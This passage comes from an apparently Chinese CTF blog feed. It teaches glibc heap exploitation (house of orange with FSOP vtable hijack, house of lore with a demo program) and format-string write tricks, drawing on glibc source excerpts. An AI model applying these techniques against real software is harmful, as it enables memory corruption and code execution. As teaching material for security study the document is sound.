bin的链表size，如果等于就会把该chunk加入到这个链表去（而且总是会插入到链表的第二个位置）；很显然最后这个是大于的情况，而p2被修改了size为0x3f0，小于p3，所以将会执行else中的代码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">else</span><br>&#123;<br>P3-&gt;fd_nextsize = P2;  <span class="hljs-comment">//P3的fd_nextsize要修改成P2的头指针</span><br>P3-&gt;bk_nextsize = P2-&gt;bk_nextsize; <span class="hljs-comment">//P3的bk_nextsize要修改成P2的bk_nextsize指向的地址</span><br>P2-&gt;bk_nextsize = P3;  <span class="hljs-comment">//P2的bk_nextsize要修改成P3的头指针</span><br>P3-&gt;bk_nextsize-&gt;fd_nextsize = P3; <span class="hljs-comment">//P3的bk_nextsize所指向的堆块的fd_nextsize要修改成P3的头指针</span><br>&#125;<br>bck = P2-&gt;bk; <span class="hljs-comment">//bck等于P2的bk</span><br></code></pre></td></tr></table></figure><h4 id="7-最终结果"><a href="#7-最终结果" class="headerlink" title="7.最终结果"></a>7.最终结果</h4><p><img src="https://cdn.jsdelivr.net/gh/Ak0er/picgo/Screenshot_20240601_155139.jpg" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/Ak0er/picgo/image-20240531202245975.png" alt="image-20240531202245975"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>house_of_orange</title>
    <link href="/2024/05/04/house-of-orange/"/>
    <url>/2024/05/04/house-of-orange/</url>
    
    <content type="html"><![CDATA[<h1 id="house-of-orange"><a href="#house-of-orange" class="headerlink" title="house of orange"></a>house of orange</h1><p>首先house of orange是一套组合全（利用了unsorted bin attack 以及 FSOP）</p><h3 id="什么是house-of-orange？"><a href="#什么是house-of-orange？" class="headerlink" title="什么是house of orange？"></a>什么是house of orange？</h3><blockquote><p>house of orange该攻击手法是在我们没有free函数的情况下，来获得一个在unsorted bin中的堆块。house of orange到这里就结束了，但之后还会利用其他的手法来拿到shell。</p><p><em>原理：</em></p><p><em>如果我们申请的堆块大小大于了top chunk size的话，那么就会将原来的top chunk放入unsorted</em> <em>bin__中，然后再映射或者扩展一个新的top chunk出来。</em></p><p><em>利用过程：</em></p><p><em>1、先利用溢出等方式进行篡改top chunk的size</em></p><p><em>2、然后申请一个大于top chunk的size</em></p></blockquote><p>关于对old_topd的检查函数如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c">old_top = av-&gt;top;<span class="hljs-comment">//原本old top chunk的地址</span><br>old_size = chunksize (old_top);<span class="hljs-comment">//原本old top chunk的size</span><br>old_end = (<span class="hljs-type">char</span> *) (chunk_at_offset (old_top, old_size));<span class="hljs-comment">//old top chunk的地址加上其size</span><br><br>brk = snd_brk = (<span class="hljs-type">char</span> *) (MORECORE_FAILURE);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">   If not the first time through, we require old_size to be</span><br><span class="hljs-comment">   at least MINSIZE and to have prev_inuse set.</span><br><span class="hljs-comment"> */</span><br><br>assert ((old_top == initial_top (av) &amp;&amp; old_size == <span class="hljs-number">0</span>) ||<br>        ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;<br>         prev_inuse (old_top) &amp;&amp;<br>         ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) old_end &amp; (pagesize - <span class="hljs-number">1</span>)) == <span class="hljs-number">0</span>));<br><br>assert ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (old_size) &lt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb + MINSIZE));<br></code></pre></td></tr></table></figure><p>第一次调用该函数top chunk还未被初始化，所以old_size为0，并且我们需要利用的时候这个条件也不可能满足，所以可以忽略。</p><p>第一个条件无法成立的话，那么就需要从第二个条件入手，也就是要保证我们的old_size必须不小于MINSIZE，以及需要保证old_size的prev_size位必须为1，并且原本old top chunk的地址加上其size之后的地址要与页对齐，也就是address&amp;0xfff&#x3D;0x000。最后old chunk的size必须要小于我们申请的堆块大小加上MINSIZE。</p><p>如果我们申请的堆块大于了0x20000，那么将会是mmap映射出来的内存，并非是扩展top chunk了。</p><p>总结下，我们需要绕过检查所需要构造的值：</p><p>old_top_size(我们通过溢出修改) nb（我们申请的堆块大小）</p><blockquote><p><em>MINSIZE&lt;old_top_size&lt;<strong>nb</strong>+MINSIZE</em></p><p><em>old_top_size的prev_size位是1</em></p><p><em>(old_top_size+old_top</em><em>-1</em><em>)&amp;0xfff&#x3D;0x000&#x2F;&#x2F;红色块为猜测</em></p><p><em>nb</em><em>&lt;0x20000</em></p></blockquote><p>首先第一步就是要通过溢出的手法来把top_chunk的size位改成符合以上条件的大小，然后再申请一个大于top chunk的size一个chunk(也就是我们的nb)，这样top chunk就进入到了<strong>unsorted bin</strong>(具体查看另一篇文章)</p><h2 id="FSOP"><a href="#FSOP" class="headerlink" title="FSOP"></a>FSOP</h2><p>  首先通过house of orange把top chunk申请到了unsorted bin中，如果我们能够覆盖这个位于unsorted bin中堆块的bk指针，然后通过unsorted bin attack就可以向一个指定的地址写入一个很大的值（main_arena+88(96)）。而我们需要的就是通过unsorted bin attack向<code>_IO_list_all</code>写入这个地址main_arena+88(96),然后去打一个FSOP。</p><ul><li>FSOP就是要篡改<code>_IO_list_all</code>和 <code>_chain</code>,以达到劫持 <code>IO_FILE</code>的目的（也就是把这个结构体放到了可以控制的内存上）。</li><li>然后我们通过其中的 <code>_IO_flush_all_lockp</code> 来刷新 <code>_IO_list_all</code> 链表上的所有文件（就是对所有的文件流执行了一个fflush）</li><li>又因为fflush会调用vtable中的<code>_IO_overflow</code>并且<code>IO_FILE</code>又被我们所劫持,所以我们可以修改vtable中的 <code>_IO_overflow</code>函数地址(如：将其修改为system的地址)</li><li>触发该机制时，执行的函数会以 <code>_IO_FILE</code>结构体的地址作为函数的第一个参数，因此我们让<code>IO_FILE</code>结构的flags成员为&#x2F;bin&#x2F;sh字符串，那么当<strong>执行exit函数</strong>或者<strong>libc执行abort流程</strong>时或者程序从<strong>main函数返回时</strong>触发了<code>_IO_flush_all_lockp</code>就会拿到shell。</li></ul><p>正常的链表结构为：</p><p><img src="https://cdn.jsdelivr.net/gh/Ak0er/picgo/image-20240408193408781.png" alt="image-20240408193408781"></p><p>通过FSOP的布局：</p><ol><li>首先篡改<code>_IO_list_all</code>为main_arena+88这个地址（因为这一片的内存不可控），而chain字段是首地址加上0x68的偏移得到的，所以<strong>下一个</strong><code>_IO_FILE</code>结构体的地址为<code>main_arena+88(96)+0x68</code>。</li><li>巧合的是这个地址（main_arena+88+0x68）的恰好是smallbin中size为0x60的chunk链，如果能将一个chunk放到这个small bin中size为0x60的链上，那么篡改<code>_IO_list_all</code>为main_arena+88         这个地址后，small bin中的chunk就是IO_FILE结构体了。</li><li>把这个chunk申请出来，我们就成功的控制了一块<code>_IO_FILE</code>结构体了，接下来就可以伪造vtable字段最终拿到shell</li></ol><p><img src="https://cdn.jsdelivr.net/gh/Ak0er/picgo/image-20240408194015739.png" alt="image-20240408194015739"></p><p>接下来就是具体的布局需要绕过的if检查以达到成功执行<code>_IO_OVERFLOW</code>函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">     <span class="hljs-keyword">if</span> (<br>         (<br>             (fp-&gt;_mode &lt;= <span class="hljs-number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)<br>          || (_IO_vtable_offset (fp) == <span class="hljs-number">0</span> &amp;&amp; fp-&gt;_mode &gt; <span class="hljs-number">0</span> &amp;&amp; (fp-&gt;_wide_data &gt; _IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base))<br>         )<br>         &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF<br>     )<br>result = EOF;<br></code></pre></td></tr></table></figure><p>通过上面的代码可以知道我们如果需要<code>_IO_OVERFLOW(fp,EOF)</code>成功执行就需要使连接其的&amp;&amp;的前半部分的结果为1，也就是使<code>(fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</code>**(称为一号条件)<strong>或者<code>(_IO_vtable_offset (fp) == 0 &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data &gt; _IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</code></strong>(称为二号条件)**的其中一个条件成立，前一个条件看起来更加的短，我们只需要mode&#x3D;0,<code>_IO_write_ptr</code>&#x3D;1,<code>_IO_wirte_base</code>&#x3D;0（改成满足条件的三个值就可以）,这样就可以触发<code>_IO_OVERFLOW</code>函数。</p><p><strong>注</strong>：为什么house of orange之后打FSOP的成功概率是1&#x2F;2？</p><p>由于触发了<code>_IO_flush_all_lockp</code>函数，会根据_IO_list_all和chain字段来去依次遍历链表上的每个_<code>IO_FILE</code>结构体，在我们整体布局完成后，第一个结构体就是从main_arena+88开始。而第一个结构体的mode字段是main_arena+88+0xc0处的数据决定的(如下图)。<strong>mode字段是四字节</strong></p><p><img src="https://cdn.jsdelivr.net/gh/Ak0er/picgo/image-20240408201423828.png" alt="image-20240408201423828"></p><p>因为这个是一个libc的地址，而libc的地址是随机的，所以这个值有可能是真的也有可能是负的，这四个字节可能是0到0xffffffff之间的任何一个值,而这个值只要大于0x7fffffff就为负，反之则为正。所以刚好_mode字段的正负可能性都为1&#x2F;2</p><p>至于为什么mode字段要求为正，是因为在上面提到的检查机制，我们的布局是以一号条件为目的的而其中就要求mode&lt;&#x3D;0</p><p><strong>house of orange中的函数调用流程为</strong>：<code>__libc_malloc-&gt;malloc_printerr-&gt;libc_message-&gt;abort-&gt;_IO_flush_all_lockp</code></p><h3 id="IO-FILE结构体："><a href="#IO-FILE结构体：" class="headerlink" title="IO_FILE结构体："></a>IO_FILE结构体：</h3><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs sqf"><span class="hljs-number">0</span>x0   <span class="hljs-variable">_flags</span><br><span class="hljs-number">0</span>x8   <span class="hljs-variable">_IO_read_ptr</span><br><span class="hljs-number">0</span>x10  <span class="hljs-variable">_IO_read_end</span><br><span class="hljs-number">0</span>x18  <span class="hljs-variable">_IO_read_base</span><br><span class="hljs-number">0</span>x20  <span class="hljs-variable">_IO_write_base</span><br><span class="hljs-number">0</span>x28  <span class="hljs-variable">_IO_write_ptr</span><br><span class="hljs-number">0</span>x30  <span class="hljs-variable">_IO_write_end</span><br><span class="hljs-number">0</span>x38  <span class="hljs-variable">_IO_buf_base</span><br><span class="hljs-number">0</span>x40  <span class="hljs-variable">_IO_buf_end</span><br><span class="hljs-number">0</span>x48  <span class="hljs-variable">_IO_save_base</span><br><span class="hljs-number">0</span>x50  <span class="hljs-variable">_IO_backup_base</span><br><span class="hljs-number">0</span>x58  <span class="hljs-variable">_IO_save_end</span><br><span class="hljs-number">0</span>x60  <span class="hljs-variable">_markers</span><br><span class="hljs-number">0</span>x68  <span class="hljs-variable">_chain</span><br><span class="hljs-number">0</span>x70  <span class="hljs-variable">_fileno</span><br><span class="hljs-number">0</span>x74  <span class="hljs-variable">_flags2</span><br><span class="hljs-number">0</span>x78  <span class="hljs-variable">_old_offset</span><br><span class="hljs-number">0</span>x80  <span class="hljs-variable">_cur_column</span><br><span class="hljs-number">0</span>x82  <span class="hljs-variable">_vtable_offset</span><br><span class="hljs-number">0</span>x83  <span class="hljs-variable">_shortbuf</span><br><span class="hljs-number">0</span>x88  <span class="hljs-variable">_lock</span><br><span class="hljs-number">0</span>x90  <span class="hljs-variable">_offset</span><br><span class="hljs-number">0</span>x98  <span class="hljs-variable">_codecvt</span><br><span class="hljs-number">0</span>xa0  <span class="hljs-variable">_wide_data</span><br><span class="hljs-number">0</span>xa8  <span class="hljs-variable">_freeres_list</span><br><span class="hljs-number">0</span>xb0  <span class="hljs-variable">_freeres_buf</span><br><span class="hljs-number">0</span>xb8  <span class="hljs-variable">__pad5</span><br><span class="hljs-number">0</span>xc0  <span class="hljs-variable">_mode</span><br><span class="hljs-number">0</span>xc4  <span class="hljs-variable">_unused2</span><br><span class="hljs-number">0</span>xd8  vtable<br></code></pre></td></tr></table></figure><h4 id="vtable中的函数指针："><a href="#vtable中的函数指针：" class="headerlink" title="vtable中的函数指针："></a>vtable中的函数指针：</h4><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs sqf">const struct <span class="hljs-variable">_IO_jump_t</span> <span class="hljs-variable">_IO_wstrn_jumps</span> attribute_hidden =<br>&#123;<br>  JUMP_INIT_DUMMY,<br>  JUMP_INIT(finish, <span class="hljs-variable">_IO_wstr_finish</span>),<br>  JUMP_INIT(overflow, (<span class="hljs-variable">_IO_overflow_t</span>) <span class="hljs-variable">_IO_wstrn_overflow</span>),<br>  JUMP_INIT(underflow, (<span class="hljs-variable">_IO_underflow_t</span>) <span class="hljs-variable">_IO_wstr_underflow</span>),<br>  JUMP_INIT(uflow, (<span class="hljs-variable">_IO_underflow_t</span>) <span class="hljs-variable">_IO_wdefault_uflow</span>),<br>  JUMP_INIT(pbackfail, (<span class="hljs-variable">_IO_pbackfail_t</span>) <span class="hljs-variable">_IO_wstr_pbackfail</span>),<br>  JUMP_INIT(xsputn, <span class="hljs-variable">_IO_wdefault_xsputn</span>),<br>  JUMP_INIT(xsgetn, <span class="hljs-variable">_IO_wdefault_xsgetn</span>),<br>  JUMP_INIT(seekoff, <span class="hljs-variable">_IO_wstr_seekoff</span>),<br>  JUMP_INIT(seekpos, <span class="hljs-variable">_IO_default_seekpos</span>),<br>  JUMP_INIT(setbuf, <span class="hljs-variable">_IO_default_setbuf</span>),<br>  JUMP_INIT(sync, <span class="hljs-variable">_IO_default_sync</span>),<br>  JUMP_INIT(doallocate, <span class="hljs-variable">_IO_wdefault_doallocate</span>),<br>  JUMP_INIT(read, <span class="hljs-variable">_IO_default_read</span>),<br>  JUMP_INIT(write, <span class="hljs-variable">_IO_default_write</span>),<br>  JUMP_INIT(seek, <span class="hljs-variable">_IO_default_seek</span>),<br>  JUMP_INIT(close, <span class="hljs-variable">_IO_default_close</span>),<br>  JUMP_INIT(stat, <span class="hljs-variable">_IO_default_stat</span>),<br>  JUMP_INIT(showmanyc, <span class="hljs-variable">_IO_default_showmanyc</span>),<br>  JUMP_INIT(imbue, <span class="hljs-variable">_IO_default_imbue</span>)<br>&#125;;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>格式化字符的漏洞利用</title>
    <link href="/2024/05/04/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    <url>/2024/05/04/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h2 id="1-n-hn-hhn"><a href="#1-n-hn-hhn" class="headerlink" title="1.%n,%hn,%hhn"></a>1.%n,%hn,%hhn</h2><p>  这个格式化字符串的是格式化字符串漏洞利用的核心所在，%n的作用就是把已经成功输出的字符个数写入对应的整形指针参数所指的变量。%n（一次写入四个字节），%hn（一次写入两个字节），%hhn（一次写入一个字节）。</p><p>%hh的作用是限定输出格式为8位，即一个字节；<br>%h的作用是限定输出格式为16位，即两个字节；<br>%l的作用是限定输出格式为32位，即四个字节；<br>%ll的作用是限定输出格式为64位，即八个字节；</p><h2 id="2-a"><a href="#2-a" class="headerlink" title="2.%a"></a>2.%a</h2><p>  %a是以double型的16进制格式输出栈中变量，当程序开启了FORTIFY机制后（gcc -D_FORTIFY_SOURCE&#x3D;2  -01），程序在编译时所有的printf函数都被_printf_chk替换了，__printf_chk和printf有两点不同：（1）不能使用%n$p不连续的打印，比如要使用%3$p，那么%1&amp;p和%2&amp;p需要同时使用;（2）在使用%n的时候会做一些检查。由于printf_chk无法单独使用%n&amp;p来泄露地址，如果可输入的字符数量有限，要通过连续多个%p泄露地址就会很困难，这种情况就可以使用%a了，%a会输出栈上方的数据。</p><p><img src="https://cdn.jsdelivr.net/gh/Ak0er/picgo/image-20230712113722387.png" alt="image-20230712113722387"></p><p><img src="https://cdn.jsdelivr.net/gh/Ak0er/picgo/image-20230712113741525.png" alt="image-20230712113741525"></p><h2 id="3-look-printf（来实现任意地址的任意写）"><a href="#3-look-printf（来实现任意地址的任意写）" class="headerlink" title="3.look_printf（来实现任意地址的任意写）"></a>3.look_printf（来实现任意地址的任意写）</h2><p>存在格式化字符漏洞</p><p>首先需要通过改printf的返回地址为read的地址以达到格式化字符串重复利用的目的，（一般不该为main函数的地址，因为会重置栈空间）其次就是需要两个指针一个指针用来修改你要写入的内容，还有一个指针用来控制你想要写的内容的地址即：</p><p><img src="C:\Users\刘先生\AppData\Roaming\Typora\typora-user-images\image-20240428215001860.png" alt="image-20240428215001860"></p><p>通过b可以修改c的值，而通过c可以修改d的值；我们通过b修改c所指向的地址，然后通过c修改任意值，如此就实现了任意地址的任意写。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>house of lore</title>
    <link href="/2024/05/04/house%20of%20lore/"/>
    <url>/2024/05/04/house%20of%20lore/</url>
    
    <content type="html"><![CDATA[<h2 id="House-of-lore"><a href="#House-of-lore" class="headerlink" title="House of lore"></a>House of lore</h2><p> 该漏洞是利用了small  bin的机制，house of lore 可以实现分配任意指定位置的chunk，从而达到修改任意地址的内存。其利用前提是需要可以控制small bin chunk的bk指针，并且控制指定位置chunk的fd指针。漏洞的本质就是small bin链表的伪造。</p><h3 id="small-bin的结构示意图"><a href="#small-bin的结构示意图" class="headerlink" title="small bin的结构示意图"></a>small bin的结构示意图</h3><p><img src="https://cdn.jsdelivr.net/gh/Ak0er/picgo/image-20240410204930412.png" alt="image-20240410204930412"></p><h3 id="检查机制"><a href="#检查机制" class="headerlink" title="检查机制"></a>检查机制</h3><p>如果在 malloc 的时候，申请的内存块在 small bin 范围内，那么执行如下函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">    If a small request, check regular bin.  Since these &quot;smallbins&quot;</span><br><span class="hljs-comment">    hold one size each, no searching within bins is necessary.</span><br><span class="hljs-comment">    (For a large request, we need to wait until unsorted chunks are</span><br><span class="hljs-comment">    processed to find best fit. But for small ones, fits are exact</span><br><span class="hljs-comment">    anyway, so we can check now, which is faster.)</span><br><span class="hljs-comment">  */</span><br><br> <span class="hljs-keyword">if</span> (in_smallbin_range(nb)) &#123;<br>     <span class="hljs-comment">// 获取 small bin 的索引</span><br>     idx = smallbin_index(nb);<br>     <span class="hljs-comment">// 获取对应 small bin 中的 chunk 指针</span><br>     bin = bin_at(av, idx);<br>     <span class="hljs-comment">// 先执行 victim= last(bin)，获取 small bin 的最后一个 chunk</span><br>     <span class="hljs-comment">// 如果 victim = bin ，那说明该 bin 为空。</span><br>     <span class="hljs-comment">// 如果不相等，那么会有两种情况</span><br>     <span class="hljs-keyword">if</span> ((victim = last(bin)) != bin) &#123;<br>         <span class="hljs-comment">// 第一种情况，small bin 还没有初始化。</span><br>         <span class="hljs-keyword">if</span> (victim == <span class="hljs-number">0</span>) <span class="hljs-comment">/* initialization check */</span><br>             <span class="hljs-comment">// 执行初始化，将 fast bins 中的 chunk 进行合并</span><br>             malloc_consolidate(av);<br>         <span class="hljs-comment">// 第二种情况，small bin 中存在空闲的 chunk</span><br>         <span class="hljs-keyword">else</span> &#123;<br>             <span class="hljs-comment">// 获取 small bin 中倒数第二个 chunk 。</span><br>             bck = victim-&gt;bk;<br>             <span class="hljs-comment">// 检查 bck-&gt;fd 是不是 victim，防止伪造</span><br>             <span class="hljs-keyword">if</span> (__glibc_unlikely(bck-&gt;fd != victim)) &#123;<br>                 errstr = <span class="hljs-string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;<br>                 <span class="hljs-keyword">goto</span> errout;<br>             &#125;<br>             <span class="hljs-comment">// 设置 victim 对应的 inuse 位</span><br>             set_inuse_bit_at_offset(victim, nb);<br>             <span class="hljs-comment">// 修改 small bin 链表，将 small bin 的最后一个 chunk 取出来</span><br>             bin-&gt;bk = bck;<br>             bck-&gt;fd = bin;<br>             <span class="hljs-comment">// 如果不是 main_arena，设置对应的标志</span><br>             <span class="hljs-keyword">if</span> (av != &amp;main_arena) set_non_main_arena(victim);<br>             <span class="hljs-comment">// 细致的检查</span><br>             check_malloced_chunk(av, victim, nb);<br>             <span class="hljs-comment">// 将申请到的 chunk 转化为对应的 mem 状态</span><br>             <span class="hljs-type">void</span> *p = chunk2mem(victim);<br>             <span class="hljs-comment">// 如果设置了 perturb_type , 则将获取到的chunk初始化为 perturb_type ^ 0xff</span><br>             alloc_perturb(p, bytes);<br>             <span class="hljs-keyword">return</span> p;<br>         &#125;<br>     &#125;<br> &#125;<br></code></pre></td></tr></table></figure><p>主要的检查</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 获取 small bin 中倒数第二个 chunk 。</span><br>bck = victim-&gt;bk;<br><span class="hljs-comment">// 检查 bck-&gt;fd 是不是 victim，防止伪造</span><br><span class="hljs-keyword">if</span> (__glibc_unlikely(bck-&gt;fd != victim)) &#123;<br>    errstr = <span class="hljs-string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;<br>    <span class="hljs-keyword">goto</span> errout;<br>&#125;<br><span class="hljs-comment">// 设置 victim 对应的 inuse 位</span><br>set_inuse_bit_at_offset(victim, nb);<br><span class="hljs-comment">// 修改 small bin 链表，将 small bin 的最后一个 chunk 取出来</span><br>bin-&gt;bk = bck;<br>bck-&gt;fd = bin;<br><br></code></pre></td></tr></table></figure><p>从这个地方我们可以看出，如果修改small bin的最后一个chunk的bk为我们的伪造的chunk(fake chunk)，并且同时绕过最后一个 chunk 的 bk 为我们指定内存地址的 fake chunk，并且同时满足之后的 bck-&gt;fd !&#x3D; victim的检测，那么就成功使small bin的链表变为了bin-&gt;fake chunk -&gt;victim chunk这样的一个单项链表，那么我们进行两次malloc就可以申请到fake chunk了。</p><h3 id="例："><a href="#例：" class="headerlink" title="例："></a>例：</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> * argv[])</span>&#123;<br><span class="hljs-type">intptr_t</span>* stack_buffer_1[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br><span class="hljs-type">intptr_t</span>* stack_buffer_2[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br><span class="hljs-type">intptr_t</span> *victim = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br><span class="hljs-built_in">free</span>(victim);<br><span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x400</span>);<br>victim[<span class="hljs-number">1</span>] = &amp;stack_buffer_1; <span class="hljs-comment">// victim_chunk_addr-&gt;bk = stack_buffer_1_addr</span><br>stack_buffer_1[<span class="hljs-number">2</span>] = victim<span class="hljs-number">-2</span>; <span class="hljs-comment">//stack_buffer_1-&gt;fd = victim_chunk_addr</span><br>stack_buffer_1[<span class="hljs-number">3</span>] = &amp;stack_buffer_2; <span class="hljs-comment">// stack_buffer_1-&gt;bk = stack_buffer_2_addr</span><br>stack_buffer_2[<span class="hljs-number">2</span>] = &amp;stack_buffer_1;<span class="hljs-comment">//stack_buffer_2-&gt;fd = stack_buffer_1_addr</span><br><span class="hljs-comment">//===============================line=================================</span><br><span class="hljs-type">intptr_t</span> *p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><span class="hljs-type">intptr_t</span> *p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<span class="hljs-comment">//chunk on the stack</span><br><span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>); <span class="hljs-comment">//failed : bck-&gt;fd != victim</span><br>&#125;<br></code></pre></td></tr></table></figure><p>执行到line的图</p><p><img src="https://cdn.jsdelivr.net/gh/Ak0er/picgo/image-20240410212152066.png" alt="image-20240410212152066"></p><p>最后一次malloc(0x100)会crash因为访问非法区域当然后面这个bck-&gt;fd !&#x3D; victim条件也不会满足</p><p>最终把chunk申请到了栈上</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>堆利用之fastbin attack</title>
    <link href="/2024/05/04/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B9%8Bfastbin%20attack/"/>
    <url>/2024/05/04/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B9%8Bfastbin%20attack/</url>
    
